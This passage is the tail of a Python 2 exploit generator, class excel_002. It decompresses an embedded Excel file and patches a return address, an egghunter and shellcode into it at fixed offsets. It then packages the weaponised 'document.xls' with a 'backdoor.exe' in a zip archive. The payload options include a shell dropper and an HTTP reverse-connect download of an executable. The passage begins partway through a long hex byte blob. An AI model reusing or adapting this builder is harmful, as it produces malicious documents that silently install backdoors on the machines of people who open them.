b"\xD2\xD5\x98\x6D\x66\x3A\x7A\x71\xD8\x57\xA3\xA7\xAB\xC4\x24\xDA"
b"\xC3\x2A\x1A\x7F\x5E\xD8\xF5\x74\x1B\xE5\x53\xC3\x5F\x52\x14\xB8"
b"\x92\xA2\xA3\x3F\xE5\x2E\xB6\x95\xD9\x33\x02\xDF\x8A\x53\xEE\xF3"
b"\x2E\xB6\xDE\x36\x24\x7C\x9D\xF5\x16\xF2\x47\xF7\xAC\xB7\xC6\x5E"
b"\xEB\x2D\xD7\x89\xDC\x73\xF6\xD4\x49\xB7\x27\xA8\xD4\xA5\x93\x8B"
b"\x55\x43\xF3\x80\xAF\x55\x0D\x61\x9A\xAF\x2F\x5D\x0D\xFD\x37\xF2"
b"\xEE\x87\xFD\x37\x9A\x90\xFD\x0F\xA3\x7A\xF1\x73\xAC\x3C\x55\xDE"
b"\xFF\xF0\xCA\xB1\xE7\xED\x7F\xC8\xDE\xC7\x75\xE3\xF0\x85\xD4\x8F"
b"\x4B\x31\x98\xB9\x0B\x31\xCA\xBB\xBD\x17\xBB\xFF\x21\x53\xED\xF0"
b"\xA8\xBE\xF7\x7F\xBC\x58\x33\x0C\x19\x19\xBA\xA6\x7F\x31\xF7\xCC"
b"\x06\xDE\x52\xB2\xAD\x1A\xBD\x41\xE3\x17\xD2\xFF\xA5\xC7\xBF\x0A"
b"\x78\x47\x19\xAC\x0A\x29\x82\xFC\x08\x60\x0B\x0A\xD8\x28\xD8\x2D"
b"\xA2\xAC\xC8\x97\xE1\x1E\xA7\xEE\x2A\x74\xEF\x9D\x3C\x78\x33\xE3"
b"\x54\xC1\xB1\x01\xEE\x3D\xB8\xE6\xED\x77\xA7\xDA\x2F\x5E\x80\x30"
b"\x0F\x46\x95\x6E\x3A\x4A\xD9\x7A\xB2\x73\x4B\x51\x41\xA3\xB8\x5A"
b"\x78\xF3\x3F\x86\x82\x7D\x99\x69\x82\x01\x3F\xE3\x04\x43\x48\xF3"
b"\x3D\xC1\x10\xE4\x8E\x22\xA5\x25\x87\x1F\x33\xF7\xD9\xDD\x9B\xCC"
b"\xD4\x5C\x48\x2C\x39\x39\x25\x8E\xD0\xC4\x05\xCF\x72\xE2\x8F\x2A"
b"\xEE\xE4\xAF\x7D\xE7\xE3\x32\xAE\xA0\xF2\x19\xB2\x9C\x02\x95\xEB"
b"\x3B\xAF\xEE\x0F\x5E\x35\x9D\x77\x85\x7B\x26\x0F\xA1\xE0\x55\x6A"
b"\xE7\x95\xCC\x0D\xA6\x52\xA0\x99\xE8\xCF\x56\x28\xFD\x9A\x19\xB0"
b"\xF2\x73\x57\x5F\x17\x7A\x65\x3F\x8F\x16\x7A\xE4\xA0\x17\x6D\xED"
b"\xAC\xAF\x82\xF0\x20\x8B\xCF\x2F\xEF\xD1\xAB\x27\xF9\x19\x15\xDB"
b"\xD3\xB4\xE7\x8E\xD2\xC1\x37\xC0\x46\x73\x5B\xC7\xED\x4C\xFF\x65"
b"\xE2\x22\xC5\x8F\x91\x17\xA1\xD0\x7C\x0A\xBD\x4F\xAF\xF8\x1F\x2E"
b"\x06\xE9\x0B\x43\xFC\x0B\x3D\xFC\x33\x7B\x51\x8F\x97\x77\xC4\x1E"
b"\xBB\x5B\x93\xB2\xC3\x68\xCF\x7C\x20\x65\xE7\xCE\x70\xF4\x70\xF1"
b"\x84\x33\x62\x48\x5B\x26\xA4\xA0\x4F\xAA\x40\xE3\x64\x55\xD4\x97"
b"\x49\x19\x68\x2C\xF3\xC2\x33\xCC\x60\x1D\xFD\x22\x1D\xC2\xB9\x3F"
b"\x08\x9D\x59\x13\x5A\xF7\x94\x82\xF3\xC1\xCF\xA9\xC8\x87\x1A\x56"
b"\xB9\xD4\x47\x6E\xC3\x1C\xDB\x82\x99\xAE\x3A\x5C\x14\x18\xD2\x31"
b"\x36\x29\xC4\xE0\x24\x3D\x5E\xAB\xFD\x9B\x4D\xED\x6A\x12\x7D\xC6"
b"\x15\x46\xA3\xB1\xDD\x6C\xB4\x9A\x8D\x59\x64\x50\x6B\x12\xEC\x94"
b"\x2C\xA6\x0A\xA3\x8C\xC6\x9C\x3C\xB1\x35\xFE\xB6\xA9\xB5\xDE\x4A"
b"\x57\xED\x48\xE1\xBF\xCA\x1B\x5C\x55\xC2\x26\xA7\x4B\x53\xDB\xE4"
b"\xD6\x55\xDB\x1B\xDD\x2E\xBD\xCF\x55\x59\x3B\x68\x44\x59\xA3\xDB"
b"\x50\xED\xAE\xAA\x75\x51\xF4\xF4\xEA\x44\x7A\x6C\x56\xE3\xD2\x78"
b"\x9B\xA3\xA5\x41\xE3\x6D\x72\x27\xA7\xCE\x72\xD7\x35\x50\xAD\xCB"
b"\xE7\x2E\x76\x37\xD6\x44\x2F\x13\x47\x6D\xB2\x2D\x6D\xF2\x79\xEB"
b"\x74\x35\xB7\xAA\x8B\xF5\x66\xBB\xB7\xDE\xA7\x69\xF4\xD6\xAE\xDA"
b"\xCC\x5A\x85\x91\xF4\x08\x6B\x33\x48\x30\x4E\xA0\x60\x63\xD0\x2E"
b"\xB7\x06\x77\x24\xC4\xAF\x5F\x15\x6B\x90\xDB\x04\x4A\x4B\x33\x8B"
b"\x23\xEF\x1A\xA1\x4A\xE8\xDC\xBB\xA4\x2F\x13\x70\x2D\x67\xD9\x2A"
b"\xE9\xD0\x54\xC6\x02\xEF\xAA\x85\x90\x72\x13\x85\x52\xF3\x0F\x9E"
b"\x4B\x53\xBB\xD5\x9E\x1C\xF4\x32\xCE\x2F\x50\x7B\x32\x60\xB3\x75"
b"\xB7\x0C\x8C\x4D\x33\x70\xC7\x95\x88\x41\xEE\xBF\xA6\xE2\x5C\x84"
b"\x51\xAE\x09\x14\x3B\xDC\x25\x38\x4A\x51\x7B\x65\x4A\x09\x4D\x07"
b"\x95\xF9\x2B\x57\x28\x72\xEF\x17\xB4\xF3\x94\x2B\x07\xAE\xB2\x31"
b"\x6A\x9D\x81\x23\x03\x94\x1A\x6A\xA2\xA5\x7C\x7D\xDA\x00\x2E\xDB"
b"\x5B\xA6\x06\x23\x7A\x03\xD2\xC0\x76\x6F\x36\xE0\xCE\x06\x1C\xB5"
b"\x9C\xEA\x42\x5F\x5E\x03\x7A\x7D\x8F\x5D\x8D\xF5\xC2\xF9\x7A\xB0"
b"\x42\x06\xCB\x17\xD2\x83\x09\x72\xE6\xF2\x75\xC8\x2E\x3D\x34\x22"
b"\xF6\x9B\x71\x76\x51\x1D\x97\xB1\x06\x92\xB9\x21\x0D\x4B\x3F\x93"
b"\x90\xF1\x9B\x00\x0F\xDF\xF7\xBA\x94\x3F\x67\x65\x74\x37\x7C\x94"
b"\xC2\xBF\x93\x6B\xC9\xC1\xC7\xF6\x15\xB0\xAF\xE7\xAE\x19\x88\x89"
b"\x5D\x3B\x10\x53\xB8\x70\x1C\x98\x8D\xB0\x30\x98\x8E\x4C\x5C\x2E"
b"\x23\x0F\xBD\x92\x6E\x01\xB5\x8A\xFB\x99\x81\xFB\x2A\xB9\x64\x3D"
b"\xF7\xD9\xFE\x75\xD8\x52\x62\xF9\x42\x6D\x2C\x6B\x0D\xE4\x52\xD2"
b"\xA5\x9D\xB9\x48\xDB\x4C\xE4\x6C\x29\xAE\xCA\xE1\x6E\x82\x1C\x6C"
b"\xA7\x20\x37\x74\x65\x81\xFF\x0A\xEE\xAA\xE6\xF3\x2F\x37\xBF\xDF"
b"\xC7\x67\x62\x19\xB8\x63\x06\xD2\xC8\xF2\x7A\x29\x68\x5E\xF8\xEF"
b"\xCA\xE9\x50\x33\xB6\x33\x9F\xCD\x88\x87\xCD\x81\x8A\xB9\x44\x76"
b"\xC8\x9A\x8B\xD2\xE3\x44\x08\x6C\xDE\x64\x04\x6C\xB8\xB2\x81\xEF"
b"\x00\x47\x4E\x09\x7B\x67\x53\x4E\x41\x8E\x42\x37\x77\xA6\xC4\x72"
b"\xD1\xF9\x6C\xE7\xF2\xD5\x71\xD9\x2E\x5C\x02\xD8\x18\x94\xE5\x08"
b"\x7B\x2E\x11\xAE\x04\x94\xC0\x47\x69\x48\x7D\xB8\x50\x29\xEA\x4F"
b"\xFE\x9F\xE9\xCC\x7F\x2B\xD2\x69\x82\x04\xC5\x38\x58\x33\xCF\xF4"
b"\x62\x87\x1E\xEC\xCA\x6C\xB3\x18\xBA\xC8\x82\x96\xF2\xE1\xC7\xDE"
b"\xC7\x6C\xB3\xBF\xF9\x5F\x07\x77\x15\xD7\x5F\x15\xCF\xFB\x6C\x5C"
b"\x57\xA1\x6C\x87\x4F\xF7\x5C\xD0\xEA\x79\x79\x69\x06\xD5\xD0\x43"
b"\xF3\x76\x6E\xFB\xF8\x3D\xB5\x9C\x9F\xA7\xE8\x65\x2C\x62\x2F\x83"
b"\x6B\x5C\xB7\x97\x64\xBB\xCA\x8E\x1D\x69\x61\xA9\x31\x42\xD6\x7C"
b"\x5E\x3A\x72\x91\x26\x33\xBF\xCA\x41\xFA\x58\x6A\xB3\x38\xC7\x0C"
b"\x7F\x59\x90\xDD\xDE\xE9\xB7\x98\xB7\x64\x79\xC8\x3F\x47\x2F\x5A"
b"\x60\xE9\x67\xFB\xBB\x97\xC0\x87\xDC\x0E\x16\x21\x0D\x75\x3C\x2D"
b"\x15\xC8\x25\xC6\x2D\x82\x1D\x6C\x25\x67\x71\xFD\x34\xF0\xD6\x20"
b"\x58\xCB\xAD\x3C\x54\xB9\x74\xD8\x43\xF4\x25\xE7\x71\x36\xFC\xB4"
b"\x20\xCC\xAF\x5E\x6B\x6C\x5C\x92\x72\x64\xC4\x9A\x0A\xDD\x8B\x89"
b"\x3B\xCF\xA2\x24\x2D\x2D\x79\x58\x7E\x6B\x59\x4D\x6A\x30\xA3\x45"
b"\x81\xD8\xA6\xFC\x5A\xD8\x7A\xB1\xFB\x38\x76\xF6\x53\xEF\x96\xE8"
b"\x2E\x30\x72\xBD\xF0\x37\x3D\xC2\xBD\x40\xF4\xDE\x49\x36\xDD\x0E"
b"\x9D\xDD\x25\x23\x05\x93\x91\x77\xD5\x70\xE7\x40\x43\xB9\x80\x15"
b"\x61\x0F\x12\xBB\xFB\x93\x24\x36\xD1\xE8\x4C\xDA\x15\xEA\xA0\x00"
b"\x82\x60\x10\x23\x1F\x18\xF9\x92\x0D\x1B\x77\xAF\xE6\x4B\x18\x6C"
b"\x01\x83\x3D\x61\x21\x5A\x07\xAC\x27\x79\x9A\x77\x27\xF0\x1D\xE0"
b"\x2E\xE0\xBB\x21\xDF\xD3\xB8\x07\xD7\xF7\x02\x1B\xD9\x5A\x1F\x70"
b"\x1F\x70\xBF\xC2\xDF\xAC\xBC\x29\xF2\xA0\xE2\xFE\x01\xEC\xFF\x20"
b"\xF6\xC4\x9E\xE8\x87\x0A\x6D\x9B\x62\x47\xCC\xBF\xA9\xA1\xFE\xD6"
b"\xE5\xD6\x9C\xD5\x55\x73\x9E\x9B\xB6\xE7\x8E\x3B\x37\xD9\x8E\xBF"
b"\x7D\x28\x74\xFA\xB6\x50\xF9\xA8\x01\x51\x82\x30\x80\x24\xFA\x0C"
b"\x73\xBE\x28\xB5\xA3\xA5\xCA\x5D\xEB\x1F\xAF\x27\x95\x7A\x8E\xAD"
b"\xE8\xF4\x5F\xF4\xA0\xCD\xAD\xA9\x37\xE5\x1D\xB8\x5D\xB9\xB4\x98"
b"\x63\x56\x32\x76\x89\xAB\xEA\x97\xBB\xF5\xA4\x66\xFE\xF2\x1E\xCF"
b"\xD0\x93\x46\x5D\xD6\xE8\xBD\xC5\x5D\xE5\x33\x69\x07\xEB\x29\x5A"
b"\xDD\xE4\xAB\xF6\xD6\xBA\xEF\x5B\xA8\x27\x2D\xF3\xA3\x30\x7F\xB3"
b"\x9F\xF1\x4A\x3D\x9E\x9A\x2A\xF7\xA0\xA5\xEC\x5A\x5E\xA7\xFD\xDB"
b"\x30\x3D\xC5\x42\x1E\x49\x25\xD0\x02\xC7\x32\x57\xED\x52\xCC\x55"
b"\x86\xBC\xAE\xA7\xB8\xD0\x35\xE7\x3F\xD7\xC1\x97\xBA\x73\x59\xA3"
b"\xFD\x56\x16\x6D\x70\xF5\xA2\x15\x41\x88\xAC\xE9\x63\x2B\x52\x83"
b"\xC4\xAE\x39\xE3\x10\x51\xDD\x35\x93\x14\xD9\x1A\x9C\x78\x11\x0A"
b"\x4D\x10\xD9\xCC\x52\xEE\x05\x92\x44\x15\xEF\x03\x12\x78\xCF\x9B"
b"\xD4\xCF\xE9\xA2\x70\x74\xB7\x5F\x5E\xE6\x14\xC8\x98\x29\x8A\xF7"
b"\xC6\x52\x43\x72\xF4\x34\x15\xAD\x16\xA9\xFA\x5D\xB5\x9A\xB4\x94"
b"\x4A\x41\x55\x6D\xA8\xF2\x45\xB1\xAF\x74\x14\x8A\xC9\xB7\x44\x8B"
b"\xDA\x02\x51\x1B\x23\x36\x0A\xC9\x9A\xA8\xE8\xA4\x58\x31\x89\x77"
b"\x46\xF7\x93\x4E\xBC\x7A\xB2\xA8\x4D\x21\xA1\xD1\x2F\xAB\xFB\x2A"
b"\x71\x68\xE7\xA0\xD4\xCF\xC6\x71\xF1\xE8\x2D\x46\x8B\x37\x91\x2A"
b"\xB3\x62\x2A\xA6\x98\x7E\xA3\xD9\x98\x63\xC1\x14\x53\x33\x5C\xAD"
b"\xB6\xA3\x9F\x4B\x10\x92\x30\xC5\xA4\xBC\xD6\x0C\x73\xB6\x31\x03"
b"\xBD\xBE\xFD\xCA\x8A\xB9\xD3\x67\xA2\xD3\x9F\x5B\x5E\xD1\xB4\xBC"
b"\xC9\x67\x70\xD7\x59\xCC\x15\x2A\xB7\x19\xA3\xDB\xDA\xCA\x8C\xD2"
b"\x19\x0E\x0C\x6B\x97\x62\xE6\xE8\xF2\xD5\xA4\x7A\xEB\x69\x21\x09"
b"\x6B\x1C\xC8\xCF\xE2\x9A\xAA\xB5\x0E\x8C\xEC\xFC\x54\x73\x98\xAA"
b"\x56\x3B\xB6\xFA\x13\xEF\xF7\x0B\xAB\x1C\x64\x2E\x76\x5A\x8B\x8D"
b"\x39\x18\x7E\xE5\xDA\x9C\x45\x59\x26\xA3\xDF\x64\xCB\xB2\x15\x3B"
b"\x72\xFD\x8E\xC3\x45\x45\x7E\x7B\x8E\x3F\xCA\xBC\xC1\xE1\x7F\x90"
b"\x6E\x6E\x74\xD5\x19\x9C\x35\x90\xBA\xA9\x02\x39\x5E\xE7\x15\xEB"
b"\xD5\xD1\x25\x35\x55\x8D\x5E\x0C\x06\x3C\x3E\x43\xF9\x22\xCC\x38"
b"\xDD\xD5\x15\xA5\x4E\xE7\x74\x0C\x38\x4D\xA6\x8A\x92\xF2\xD2\x6C"
b"\x63\xF1\x8C\x19\x19\xEB\xF5\x6B\x4A\x0C\xA6\x42\x53\xB6\xD1\x50"
b"\x5A\xB9\xEA\x80\xC1\x8F\xB2\xD2\xE8\x6A\x5C\x4E\xD7\x6C\x64\x53"
b"\xFF\x38\xBF\x58\x52\x4E\x46\xA8\xB4\x96\xE2\xAF\xA2\x14\x41\x53"
b"\xC6\x07\x22\x3B\xEB\xA8\xDA\x27\xD0\x2E\x79\x18\x62\xD1\xD1\x6D"
b"\xFE\x78\xC1\x63\xB5\x98\x30\xA2\x2C\x36\xE5\x65\x19\xED\x18\x4A"
b"\x66\x99\x4C\xC5\xE6\xAC\x22\x4D\xBE\xD3\x2E\xCE\x71\x5A\x27\xE6"
b"\xEA\x73\x8A\x8B\x4C\x43\xE7\xD4\x35\x55\xAD\xF5\xD6\x51\x6A\xB6"
b"\xB7\xAA\x65\xDA\x78\x42\xD5\xA8\xF6\x36\x37\x19\x84\xB5\x93\xD8"
b"\x64\x1A\x73\x69\x4D\x93\x21\xAF\xF0\x8A\xB1\xE5\x65\x79\x2F\x8C"
b"\xBB\x82\x26\x15\x1A\x4C\xC5\x23\xD7\x34\xA4\x19\xEF\x6C\x5E\xA5"
b"\xB6\x8D\xFC\xEF\xE8\xD6\x0C\xE3\xF0\xD5\xCD\x19\xED\x3A\x3F\x7D"
b"\x30\xC9\x48\xBB\x55\x7E\x5D\x54\x83\x7D\xE2\xC4\x5C\x23\x86\x66"
b"\xB9\x59\xB9\x26\x73\x2E\xC6\x6F\x45\x4E\x6B\x56\x7E\xAE\x59\x3F"
b"\x31\xCB\x62\x2F\x8A\x2A\x2E\xCA\xD3\xE4\x39\x1C\xBF\x9F\x5C\x5C"
b"\x6A\xC7\x90\xCC\x71\xBB\xA9\xA2\xA8\x1A\x63\xB1\xFA\x8A\x19\xA5"
b"\xF6\xA2\x19\x62\xB9\x5F\xC5\x66\xFA\x15\x0E\x3F\xAB\xC8\xD6\x6C"
b"\x63\x61\xED\xDB\xCE\x9B\xB2\xDD\x2D\xD5\xEF\xDB\xFC\x63\xFC\x5D"
b"\xA3\x1F\x0A\x0E\x7F\x1C\xC2\x5B\x03\x56\x1F\x15\x68\xE0\x7F\x0A"
b"\xEF\xA9\x4F\x0E\x5D\x1D\xE0\xF5\x71\x96\x69\x2A\xAE\xFC\xCF\xBB"
b"\xFD\x3B\x7C\x65\xEC\x35\xAC\x69\x31\xE6\x99\x31\xA9\xB3\x57\x0F"
b"\x9D\x66\x13\x4C\xAB\xDF\xBD\xC2\xFF\x8F\xB4\xBB\x6C\xE2\x2A\x71"
b"\x42\xA5\xEE\xE0\xCD\xE9\xE9\x6A\xED\xF8\x47\x48\xFF\x48\xDF\xE5"
b"\x5F\xAE\xE9\xFD\x5F\xC6\x9E\x5E\x5C\x90\xBE\x22\xCF\x91\x67\x33"
b"\x59\xA0\x9A\x89\x45\xC6\xFC\xAC\x1C\x9B\x2D\x2F\xCB\x9A\xC3\x74"
b"\x94\x5F\xE4\xCC\x83\xF6\x4C\x8E\x7C\x47\x6B\x7A\xBC\xB6\xD8\x5B"
b"\xB5\xB4\xCE\x5D\xEF\x2B\x90\x63\xBD\x62\xCC\x34\xA3\x62\xE2\xB5"
b"\x33\x5D\x75\xEE\x82\xF4\xAE\x46\x09\xDE\xA7\xB9\x6B\x1B\x58\xBE"
b"\xB9\x5B\x7C\x2C\x1A\x23\x48\x73\xDC\x8D\x4D\x35\xDE\x7A\x14\xC5"
b"\x06\x94\xF5\xCA\x5A\x77\xF7\x55\xEF\x66\xFE\x7D\x99\x4B\x31\xC9"
b"\xFD\x58\x7F\xBE\x5B\xF9\x3E\x10\xF1\x6F\xE8\xF4\x67\xD5\x3D\x74"
b"\xE1\x58\x64\x8F\x63\x49\x73\x09\xEB\xFF\xDF\x63\x63\x1D\x65\xD0"
b"\x1A\x85\xAC\x5B\xCA\xC7\xDE\xF2\x9C\x6C\x3A\x46\xDE\x1E\xBE\xAA"
b"\xD1\xDB\xFC\xB6\xBB\x19\x8B\xF8\x45\xE5\xFB\x48\x17\x1B\xFF\xF7"
b"\x81\x17\x28\x18\x7F\x31\x9F\x5F\x31\x19\xDC\x7C\xD4\x7F\x69\xF2"
b"\x58\xFB\xA1\x7F\xF6\x26\xB7\x4E\x49\xBF\xC5\x5C\x90\x6E\xC9\xB7"
b"\x98\xCD\x66\x94\x22\x14\x10\x7B\xC9\x54\x94\x14\x8B\xD1\xE4\xCC"
b"\x31\xE6\x3A\x73\x8D\xF9\xA1\x60\x45\xB0\xCC\x06\xBE\xD1\x68\x76"
b"\x4E\x74\x5A\x83\x07\xE8\x53\xED\x05\xE9\xCE\x62\xA7\xD3\x58\x64"
b"\x44\x8B\x08\xEF\x36\x06\x67\x1E\x58\xF1\xDA\x1B\xA6\x79\xD1\xE8"
b"\x3A\x5A\x7C\xEE\xFA\x6A\x77\xA3\x61\x7A\xBD\xC7\x7B\x63\xBC\xB6"
b"\xB3\xF4\x9A\x0A\x56\x58\xAC\x16\x73\x71\x5E\x8E\x31\xCB\xEE\xCC"
b"\x37\xA2\x75\xB2\x3B\xB3\xAC\x8E\x1C\x4B\x96\x11\xE1\xD9\xF3\x4D"
b"\x26\xA3\x31\xB7\xA8\x75\xD2\x1C\x9B\x63\x52\x68\x99\xEF\xBC\x36"
b"\x17\xB0\xA5\x46\xB3\xD1\x6A\xB2\x66\x31\xB7\x7C\xB2\x07\xAF\x64"
b"\x93\x93\xD7\x3A\xC9\xA1\x34\x21\xDD\x82\xF9\x42\xCB\xA5\xD0\x78"
b"\x94\x20\x9E\xDF\x2F\xB2\xE7\x5E\x77\x6C\x3B\xF9\xF7\xD2\x45\xFA"
b"\xC7\x36\x6A\x68\xFC\xE5\xBF\x7C\x9D\xAD\x50\x3F\xA4\x3C\xE0\x10"
b"\x94\xE7\x50\x6A\xE5\x3B\x53\x1A\xE5\x7B\x51\x49\xCA\xEA\xB1\x4E"
b"\x19\xCA\xC4\x2B\xE3\xEE\x81\xCA\x78\x9A\xC5\xF4\xAE\x5A\xFE\x86"
b"\x16\xBB\x47\x79\x29\x37\xAC\x9B\x3D\x54\x91\xFB\x1A\xD6\xD5\xF0"
b"\xA4\xCB\x8F\x15\x97\x2C\x3A\x34\x26\xFB\x20\x7B\xEE\x4E\xFE\x85"
b"\x6F\x4D\x66\xCF\xE4\x54\x5F\x41\xFA\xC5\x97\x0F\xBD\xBC\x25\xFB"
b"\x32\xFD\x7D\x0F\x20\xFD\x13\xFE\xFE\x04\x4B\xFF\x9B\xCA\x6E\x48"
b"\x82\xF2\xFD\xAC\x01\x4A\xBA\x07\x2B\xE9\x8E\x53\xBE\x6B\xA5\x57"
b"\xBE\x5F\x35\x50\xD1\x43\x8A\x32\x1F\x89\x57\xE6\x1D\x4C\x3F\xBF"
b"\xEA\x43\x1F\x2C\x3D\x03\x2E\x8F\xE3\xE1\x05\xBF\x79\x16\xCE\x4E"
b"\xD3\xCB\x0F\x9E\x62\xBA\xDA\xF2\xCE\x4B\x73\xD7\xA5\x85\x74\xCA"
b"\x07\x2F\xD3\x94\x9B\xE7\x7A\x1B\x17\x37\x31\x56\x13\xBF\xBF\xBF"
b"\xFA\x13\xA0\x41\x95\x56\x6E\x3B\x7A\x7E\x3B\x6F\x64\xB7\xFC\x93"
b"\xC7\x97\x72\x36\x1A\x3A\x63\xE7\x0F\x52\x6C\x35\x1E\x8F\x95\x0F"
b"\xE4\x38\x37\x9B\x8B\x9C\x6D\xA5\xCF\xF2\x77\x2F\xB9\x60\xFC\xF2"
b"\xDA\x43\x83\xB2\x52\x75\xA9\x26\xA9\x1F\xED\xCF\x56\xE5\x3B\x66"
b"\x5F\x96\xB9\xD4\xF8\xBF\x6C\xF3\x6D\x8E\xFF\xFF\x00\x1C\x88\xD8"
b"\x41"
)
		#self.source_pdf = 'resources/blank.pdf'
		self.dest_doc = outputFile
		self.infile = inputFile
		
		return

	"""
	return a random char from a range
	"""
	def getrandchar(self):
		chars = "q0w1e2r3t4y5u6i7o8p9a_sdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM"
		i = self.r.randint(0, len(chars)-1)
		return chars[i]

	"""
	return a file name (random dot html (omissis))
	"""
	def randfilename(self):
		newfilename = ""
		
		for i in range(8):
			newfilename += struct.pack('c', self.getrandchar())
				
		return newfilename

	def createShellcode(self):
		result = None
		
		if payload == 0:
			obj = x86shelldrop.x86shelldrop()
			x = obj.get(self.infile)
			#result = struct.pack('l', len(x)+4) + x
			result = x
		elif payload == 1:
			obj = x86shelldrophttp.x86shelldrophttp()
			x = obj.get(self.infile)
			result = x
		elif payload == 2:
			obj = x86helloworld.x86helloworld()
			x = obj.get()
			result = x
			
		if self.debugmode == True:
			obj = x86int3.x86int3()
			result = obj.get() + result
			
		return result

	def make_doc(self):
		input = bytearray(zlib.decompress(self.compressedfile))
		#input = bytearray(self.compressedfile)
		
		#secondstage = 
		shellcode = self.createShellcode()

		retadd = b"\xDA\x89\x5b\x27\xFF\xFF\x81\xEC\x5B\x27\x00\x00\xeb\x22"   #return address + sub esp, 275Bh; jmp egghunter

		for i in range(0,14):
			input[0x2B20 + i] = retadd[i]
			input[0x2BAC + i] = retadd[i]
			input[0x2C38 + i] = retadd[i]
			input[0x2CC4 + i] = retadd[i]
			input[0x2D50 + i] = retadd[i]
			input[0x2DF4 + i] = retadd[i]
			input[0x2E80 + i] = retadd[i]
			input[0x2F0C + i] = retadd[i]
			input[0x2F98 + i] = retadd[i]
			input[0x303C + i] = retadd[i]
			input[0x30C8 + i] = retadd[i]
			input[0x3154 + i] = retadd[i]
			input[0x31E0 + i] = retadd[i]
			input[0x3284 + i] = retadd[i]
			input[0x3310 + i] = retadd[i]
			input[0x339C + i] = retadd[i]
			input[0x3428 + i] = retadd[i]
			input[0x34CC + i] = retadd[i]
			input[0x3558 + i] = retadd[i]
			input[0x35E4 + i] = retadd[i]
			input[0x3670 + i] = retadd[i]
			
		for i in range(0,len(egghunter)):
			input[0x2B20 + 0x30 + i] = egghunter[i]
			input[0x2BAC + 0x30 + i] = egghunter[i]
			input[0x2C38 + 0x30 + i] = egghunter[i]
			input[0x2CC4 + 0x30 + i] = egghunter[i]
			input[0x2D50 + 0x30 + i] = egghunter[i]
			input[0x2DF4 + 0x30 + i] = egghunter[i]
			input[0x2E80 + 0x30 + i] = egghunter[i]
			input[0x2F0C + 0x30 + i] = egghunter[i]
			input[0x2F98 + 0x30 + i] = egghunter[i]
			input[0x303C + 0x30 + i] = egghunter[i]
			input[0x30C8 + 0x30 + i] = egghunter[i]
			input[0x3154 + 0x30 + i] = egghunter[i]
			input[0x31E0 + 0x30 + i] = egghunter[i]
			input[0x3284 + 0x30 + i] = egghunter[i]
			input[0x3310 + 0x30 + i] = egghunter[i]
			input[0x339C + 0x30 + i] = egghunter[i]
			input[0x3428 + 0x30 + i] = egghunter[i]
			input[0x34CC + 0x30 + i] = egghunter[i]
			input[0x3558 + 0x30 + i] = egghunter[i]
			input[0x35E4 + 0x30 + i] = egghunter[i]
			input[0x3670 + 0x30 + i] = egghunter[i]

		offset = 0x4040
		for i in range(0,256):
			input[offset + i] = b"\x41\x90"[i%2]                                       #egg hunted

		for i in range(0,len(shellcode)):
			input[offset + 0x100 + i] = shellcode[i]

		tmp_bkname = os.path.split(self.dest_doc)[1]
		
		with warnings.catch_warnings():
			warnings.simplefilter('ignore')
			tmp_doc = os.tempnam()
			tmp_backdoor = os.tempnam()
			
		f = open(tmp_doc,mode='wb')
		f.write(input)
		f.close()
		
		# Create the output archive
		print "Creating %s zip file archive"%(self.outputCompressed)
		zip = zipfile.ZipFile(self.outputCompressed, "w", zipfile.ZIP_DEFLATED)
		
		print "Adding xls file"
		zip.write(tmp_doc, "document.xls")
		print "Adding backdoor"
		zip.write(self.dest_doc, "backdoor.exe")
		
		zip.close()
		
		try:
			os.unlink(tmp_doc)
		except WindowsError:
			print "I/O error when deleting temp. files"
			
		return 1

		
		return

	def run(self):
		self.make_doc()
		return 1

if __name__=='__main__':
	dbg = False
	http = False
	
	if len(sys.argv) < 4:
		print "[ERROR] %s require 4 parameters"%(DESCRIPTION)
		print "[-INFO] [DROPFILE] destination backdoor_file [-debug | -http]"
		sys.exit(0)

	if len(sys.argv) > 3:
		for i in range(3, len(sys.argv)):
			if sys.argv[i] == '-http':
				print "[HTTP] Using HTTP reverse connect to download exe"
				payload = 1
				http = True
			elif sys.argv[i] == '-debug':
				print "[DEBUG] Using INT3 exploit mode"
				dbg = True
			elif sys.argv[i] == '-hello':
				print "[HELLOWORLD] Using HelloWorld payload"
				payload = 2

	if http == False:
		if os.path.isfile(sys.argv[1]) == False:
			print "[ERROR] File %s doesn't exists."%(sys.argv[1])
			sys.exit(0)

		if os.path.getsize(sys.argv[1]) == 0:
			print "[ERROR] File %s has length zero."%(sys.argv[1])
			sys.exit(0)

	if os.path.isfile(sys.argv[3]) == False:
		print "[ERROR] File %s doesn't exists."%(sys.argv[3])
		sys.exit(0)
		
	#if os.path.isfile("resources/blank.pdf") == False:
	#	print "[ERROR] resources/blank.pdf not found"
	#	sys.exit(0)
	
	print 'Running %s Exploit v %s'%(DESCRIPTION,VERSION)
	
	app=excel_002(sys.argv[1], sys.argv[2], sys.argv[3], dbg)
	app.run()
	
	print ' ... done'